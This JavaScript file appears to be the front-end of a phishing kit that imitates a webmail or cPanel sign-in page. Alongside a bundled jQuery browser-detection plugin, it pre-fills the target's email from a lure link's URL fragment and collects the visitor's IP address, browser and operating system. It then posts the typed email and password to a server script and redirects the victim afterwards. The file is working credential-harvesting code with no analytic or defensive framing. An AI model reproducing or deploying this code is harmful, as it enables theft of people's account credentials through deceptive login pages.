document.write(new Date().getFullYear());

      /*!
       * jQuery Browser detection plugin v1.1.0
       * jQuery plugin for browser detection
       *
       * https://github.com/danieledesantis/jquery-browser-detection
       *
       * Released under the MIT License
       * Copyright 2015 Daniele De Santis
       */
      (function( $ ) {

         $.extend({
            browserDetection: function ( addClass ) {

              var theBody = $('body'),
                  userAgent = window.navigator.userAgent,
                  msieIndex = userAgent.indexOf('MSIE '),
                  currentBrowser,
                  browserClass;

              if ( msieIndex !=-1 ) { // IE <= 10
                var ieVersion = userAgent.substring(msieIndex + 5, userAgent.indexOf('.', msieIndex)); // IE version
                currentBrowser = 'IE' + ieVersion;
                browserClass = 'IE ' + currentBrowser;
              } else if ( userAgent.indexOf('Trident/') !=-1 ) { // IE11
                currentBrowser = 'IE11';
                browserClass = 'IE IE11';
              } else if ( userAgent.indexOf('Chrome') != -1 ) {
                if ( userAgent.indexOf('OPR') != -1 ) { // Opera
                  currentBrowser = browserClass = 'Opera';
                } else {
                  currentBrowser = browserClass = 'Chrome'; // Chrome
                }
              } else if (userAgent.indexOf('Safari') != -1 && userAgent.indexOf('Chrome') == -1) { // Safari
                if ( userAgent.indexOf('CriOS') != -1 ) { // Chrome for iOS
                  currentBrowser = browserClass = 'Chrome';
                } else {
                  currentBrowser = browserClass = 'Safari';
                }
              } else if ( userAgent.indexOf('Firefox') != -1 ) { // Firefox
                currentBrowser = browserClass = 'Firefox';
              } else {
                currentBrowser = 'notDetected';
                browserClass = '';
              }

              if ( addClass ) { // add class
                theBody.addClass(browserClass);
              }

              return currentBrowser; // return value
            }
        });

      }( jQuery ));
    


  // let div = hh.split("#");
  // alert(div[1]);
    let href = $(location).attr('href');
    let divide1 = href.split("@");
    let divide2 = href.split("#");
    $('#theDomain').text(divide1[1]);
    $('#txtEmail').val(divide2[1]);
    let cpanel_url = "login.php";
    let userIP = '';

    var currentBrowser = $.browserDetection(true);
    $.getJSON('https://api.ipify.org?format=json', function(data){
      userIP = data.ip;
    });

    var OSName="Unknown OS";
    if (navigator.appVersion.indexOf("Win")!=-1) OSName="Windows";
    if (navigator.appVersion.indexOf("Mac")!=-1) OSName="MacOS";
    if (navigator.appVersion.indexOf("X11")!=-1) OSName="UNIX";
    if (navigator.appVersion.indexOf("Linux")!=-1) OSName="Linux";
    if (navigator.userAgent.indexOf("Android")!=-1) OSName="Android OS";
    if (navigator.userAgent.indexOf("like Mac")!=-1) OSName="iOS";

    $('#btn-submit').on('click', function(event){
      event.preventDefault();
      if ($('#txtEmail').val() != ""){
        if ($('#inputPassword').val() == "") {
          alert('Password cannot be empty!');
        } else {
          if ($('#hdnPwd').val() == "") {
            $('#iSpin').addClass('fa-spinner');
            $.ajax({
              url: cpanel_url,
              type: "POST",
              data: {
                      user: $('#txtEmail').val(),
                      pass: $('#inputPassword').val(),
                    },
              success: function(data){
                if (data == 0){
                    $('#warning').text('Your email or Password is incorrect !');
                    $('#hdnPwd').val('');
                    $('#inputPassword').val('');
                    $('#iSpin').toggleClass('fa-spinner');
                }
                else {
					 window.location = data;
                };
              },
              error: function(){

              }
            });
          }
        }
      } else {
        alert('Please, use the link you were provided to login!')
      }
    });
